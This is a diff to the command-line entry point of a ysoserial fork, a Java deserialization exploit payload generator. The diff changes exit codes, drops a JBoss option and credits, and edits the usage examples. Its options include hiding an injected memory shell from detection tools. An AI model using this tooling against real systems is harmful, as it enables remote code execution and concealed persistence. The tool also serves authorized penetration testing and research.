@@ -20,11 +20,6 @@ public class GeneratePayload {
 
 	public static CommandLine cmdLine;
 
-
-	private static final int INTERNAL_ERROR_CODE = 70;
-
-	private static final int USAGE_CODE = 64;
-
 	public static Object PAYLOAD = null;
 
 	public static void main(final String[] args) {
@@ -48,7 +43,6 @@ public class GeneratePayload {
 		options.addOption("h", "hide-mem-shell", false, "Hide memory shell from detection tools (type 2 only support SpringControllerMS)");
 		options.addOption("ht", "hide-type", true, "Hide memory shell,type 1:write /jre/lib/charsets.jar 2:write /jre/classes/");
 		options.addOption("rh", "rhino", false, "ScriptEngineManager Using Rhino Engine to eval JS");
-		options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
 		options.addOption("ncs", "no-com-sun", false, "Force Using org.apache.XXX.TemplatesImpl instead of com.sun.org.apache.XXX.TemplatesImpl");
 		options.addOption("mcl", "mozilla-class-loader", false, "Using org.mozilla.javascript.DefiningClassLoader in TransformerUtil");
 		options.addOption("dcfp", "define-class-from-parameter", true, "Customize parameter name when using DefineClassFromParameter");
@@ -57,7 +51,7 @@ public class GeneratePayload {
 
 		if (args.length == 0) {
 			printUsage(options);
-			System.exit(USAGE_CODE);
+			System.exit(1);
 		}
 
 		try {
@@ -65,7 +59,7 @@ public class GeneratePayload {
 		} catch (Exception e) {
 			System.out.println("[*] Parameter input error, please use -h for more information");
 			printUsage(options);
-			System.exit(USAGE_CODE);
+			System.exit(1);
 		}
 
 		if (cmdLine.hasOption("inherit")) {
@@ -74,10 +68,6 @@ public class GeneratePayload {
 
 		if (cmdLine.hasOption("obscure")) {
 			IS_OBSCURE = true;
-		}
-
-		if (cmdLine.hasOption("jboss")) {
-			IS_JBOSS_OBJECT_INPUT_STREAM = true;
 		}
 
 		if (cmdLine.hasOption("cmd-header")) {
@@ -153,7 +143,7 @@ public class GeneratePayload {
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
 			printUsage(options);
-			System.exit(USAGE_CODE);
+			System.exit(1);
 			return;
 		}
 
@@ -190,7 +180,7 @@ public class GeneratePayload {
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
 			e.printStackTrace();
-			System.exit(INTERNAL_ERROR_CODE);
+			System.exit(1);
 		}
 		System.exit(0);
 	}
@@ -211,10 +201,7 @@ public class GeneratePayload {
 				"     _____.,[ 暖风熏得游人醉 ],._____\n" +
 				"     _____.,[ 直把杭州作汴州 ],._____"
 		);
-		System.err.println("[root]#~  A Mind-Blowing Tool Collected By [ su18@javaweb.org ]");
-		System.err.println("[root]#~  Shout Out to Yzmm / Shxjia / Y4er / N1nty / C0ny1 / Phith0n / Kezibei");
-		System.err.println("[root]#~  AND OF COURSE TO THE All MIGHTY @frohoff  ");
-		System.err.println("[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' [options]");
+		System.err.println("[root]#~  Usage: java -jar ysoserial-[version]-su18-all.jar -g [payload] -p [command] [options]");
 		System.err.println("[root]#~  Available payload types:");
 
 		final List<Class<? extends ObjectPayload>> payloadClasses =
@@ -244,9 +231,9 @@ public class GeneratePayload {
 		helpFormatter.printHelp("ysoserial-[version]-su18-all.jar", options, true);
 
 		System.err.println("\r\n");
-		System.err.println("Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i");
+		System.err.println("Recommended Usage: -g [payload] -p '[command]' -dt 1 -dl 50000 -o -i -f evil.ser");
 		System.err.println("If you want your payload being extremely short，you could just use:");
-		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]'");
+		System.err.println("java -jar ysoserial-[version]-su18-all.jar -g [payload] -p '[command]' -i -f evil.ser");
 
 	}
 }
